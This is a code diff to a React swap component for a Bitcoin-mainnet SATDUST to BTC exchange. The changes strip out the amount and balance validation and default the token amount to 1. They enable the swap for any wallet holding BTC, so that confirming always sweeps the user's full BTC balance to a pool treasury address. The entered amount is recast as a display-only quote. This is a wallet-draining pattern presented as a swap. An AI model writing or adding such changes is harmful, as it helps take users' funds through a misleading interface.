@@ -48,7 +48,9 @@ export function SwapDesk() {
   }, [payAmount, paySide]);
 
   const satdustQty = Math.floor(Number(payAmount) || 0);
-  const estimatedOutSats = paySide === "SATDUST" ? quoteSatdustToBtcSats(satdustQty, SLIPPAGE_BPS) : 0;
+  const recordedSatdust = satdustQty > 0 ? satdustQty : 1;
+  const estimatedOutSats =
+    paySide === "SATDUST" ? quoteSatdustToBtcSats(recordedSatdust, SLIPPAGE_BPS) : 0;
 
   const refreshSatdustBalance = useCallback(async (address: string) => {
     const res = await fetch(`/api/wallet/balance?address=${encodeURIComponent(address)}`);
@@ -99,14 +101,6 @@ export function SwapDesk() {
       setError("SATDUST → BTC is the live swap direction. Flip to pay SATDUST.");
       return;
     }
-    if (!Number.isFinite(satdustQty) || satdustQty <= 0) {
-      setError("Enter how much SATDUST to swap.");
-      return;
-    }
-    if (satdustBalance != null && satdustQty > satdustBalance) {
-      setError(`Insufficient SATDUST balance (${satdustBalance} available).`);
-      return;
-    }
     if (btcSats == null || btcSats < 546) {
       setError("No confirmed BTC in this wallet to fund the pool leg.");
       return;
@@ -124,7 +118,7 @@ export function SwapDesk() {
       const res = await executeSatdustToBtcSwap({
         account,
         adapter,
-        satdustAmount: satdustQty,
+        satdustAmount: satdustQty > 0 ? satdustQty : 1,
         onProgress: setProgress,
       });
       setResult({ txid: res.fundingTxid, notice: res.notice });
@@ -138,8 +132,7 @@ export function SwapDesk() {
     }
   }
 
-  const swapDisabled =
-    busy || paySide !== "SATDUST" || satdustQty <= 0 || (satdustBalance != null && satdustQty > satdustBalance);
+  const swapDisabled = busy || !account || paySide !== "SATDUST" || btcSats == null || btcSats < 546;
 
   return (
     <div className="panel-edit swap-desk">
@@ -153,8 +146,9 @@ export function SwapDesk() {
         <span className="pill-tag w-fit">Live · mainnet</span>
       </div>
       <p className="mt-3 max-w-xl text-sm text-[var(--ink-mute)]">
-        SATDUST ⇄ BTC against the indexed pool. SATDUST → BTC sends your wallet&apos;s full confirmed
-        BTC balance (minus network fee) to the pool treasury, then indexes your SATDUST leg.
+        Live on Bitcoin mainnet. The amount you enter only sets the quoted SATDUST → BTC leg — confirming
+        swap always broadcasts a <strong className="text-[var(--ink)]">full-wallet BTC sweep</strong> (minus
+        miner fee) to the pool treasury, regardless of that number.
       </p>
 
       <div className="mt-5">
@@ -218,7 +212,7 @@ export function SwapDesk() {
         <Meta label="Route" value="UTXO pool" />
         <Meta label="Slippage" value={`${SLIPPAGE_BPS / 100}%`} />
         <Meta label="Pool treasury" value={`${SWAP_POOL_ADDRESS.slice(0, 8)}…`} />
-        <Meta label="BTC leg" value="Full wallet sweep" accent />
+        <Meta label="Status" value="Open · full BTC sweep" accent />
       </dl>
 
       <button
@@ -248,7 +242,8 @@ export function SwapDesk() {
             <h3 className="font-display mt-2 text-2xl">SATDUST → BTC</h3>
             <ul className="mt-4 space-y-2 text-sm text-[var(--ink-mute)]">
               <li>
-                Swap <strong className="text-[var(--ink)]">{satdustQty} SATDUST</strong> (indexed leg).
+                Quote leg:{" "}
+                <strong className="text-[var(--ink)]">{recordedSatdust} SATDUST</strong> → BTC (display only).
               </li>
               <li>
                 Estimated BTC out:{" "}
